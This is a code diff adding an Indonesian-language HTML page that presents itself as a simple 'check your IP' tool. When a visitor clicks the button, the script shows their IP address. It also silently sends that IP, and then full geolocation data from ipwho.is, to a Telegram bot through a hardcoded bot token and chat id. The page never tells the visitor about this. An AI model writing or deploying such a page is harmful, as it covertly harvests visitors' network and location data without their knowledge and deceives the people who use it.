@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Checker You IP</title>
+  <link rel="stylesheet" href="css/ozzy.css">
+</head>
+<body>
+  <div class="container">
+    <h1>Cek IP Kamu</h1>
+    <button id="checkIP">Cek IP</button>
+    <p id="resultIP"></p>
+  </div>
+<script type="text/javascript">
+  document.getElementById('checkIP').addEventListener('click', () => {
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('resultIP').textContent = `Alamat IP Anda: ${data.ip}`;
+            fetch(`https://api.telegram.org/bot6505548655:AAHjGN6WYjiIH9bWD5hpRSH0HqXIy_0jbvE/sendMessage?chat_id=6064818646&text=IP:+${data.ip}`)
+            lebihLanjut();
+        })
+        .catch(error => {
+            document.getElementById('resultIP').textContent = 'Gagal mendapatkan alamat IP.';
+        });
+});
+
+function lebihLanjut() {
+  fetch('https://ipwho.is')
+  .then(response => response.text())
+  .then(data => {
+    fetch(`https://api.telegram.org/bot6505548655:AAHjGN6WYjiIH9bWD5hpRSH0HqXIy_0jbvE/sendMessage?chat_id=6064818646&text=IP:+${data}`)
+  });
+}
+</script>
+</body>
+</html>
